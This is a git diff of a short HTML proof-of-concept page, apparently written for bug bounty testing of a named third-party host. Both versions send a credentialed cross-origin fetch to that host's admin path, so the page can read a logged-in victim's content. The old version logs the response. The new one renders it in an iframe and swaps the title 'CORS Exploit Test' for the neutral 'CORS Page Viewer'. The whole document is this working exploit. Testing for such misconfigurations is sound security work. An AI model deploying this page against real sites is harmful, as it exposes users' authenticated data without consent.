@@ -1,26 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Exploit Test</title>
+  <title>CORS Page Viewer</title>
 </head>
 <body>
-  <h1>CORS Exploit Test</h1>
-  <button onclick="sendCorsRequest()">Test CORS</button>
+  <h2>Load CORS content from intigriti.ilias-solutions.com</h2>
+  <button onclick="loadPage()">Load Page</button>
+  <iframe id="corsFrame" width="100%" height="600px"></iframe>
 
   <script>
-    function sendCorsRequest() {
+    function loadPage() {
       fetch("https://intigriti.ilias-solutions.com/intigriti/assmgmt/", {
-        method: "GET",
-        credentials: "include"  // Include cookies
+        credentials: "include"
       })
-      .then(response => response.text())
-      .then(text => {
-        console.log("CORS Response:", text);
-        alert("Response received. Check devtools.");
+      .then(res => res.text())
+      .then(html => {
+        const iframe = document.getElementById('corsFrame');
+        const doc = iframe.contentDocument || iframe.contentWindow.document;
+        doc.open();
+        doc.write(html);
+        doc.close();
       })
       .catch(err => {
-        console.error("CORS Error:", err);
-        alert("CORS request failed. Maybe patched?");
+        alert("CORS failed or blocked.");
+        console.error(err);
       });
     }
   </script>
